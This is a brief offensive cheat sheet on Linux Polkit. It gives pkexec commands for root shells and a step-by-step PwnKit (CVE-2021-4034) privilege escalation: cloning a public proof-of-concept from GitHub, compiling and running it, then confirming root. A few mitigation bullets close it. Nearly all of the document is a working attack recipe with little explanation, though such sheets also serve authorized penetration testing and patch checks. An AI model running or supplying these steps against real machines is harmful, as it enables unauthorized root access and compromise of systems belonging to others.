# Polkit

## Run Command as Root Using pkexec

```bash
pkexec -u root id
pkexec -u root /bin/bash
```

## Check if a Process Is Authorized for an Action

```bash
pkcheck --process <pid> --action-id <action_id> --allow-user-defaults
```

## List Available Actions

```bash
pkaction
```

## Run a Command as Another User

```bash
pkexec --user <username> <command>
```

## Clone Exploit (PwnKit)

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
```

## Compile Exploit

```bash
gcc cve-2021-4034-poc.c -o poc
```

## Run Exploit

```bash
./poc
```

## Verify Root Access

```bash
id
whoami
```

## Mitigation

* Keep Polkit updated; PwnKit is one of the most widely abused bugs.
* Monitor `pkexec` invocation in logs.
* Misconfigured Polkit rules can also lead to privilege escalation.
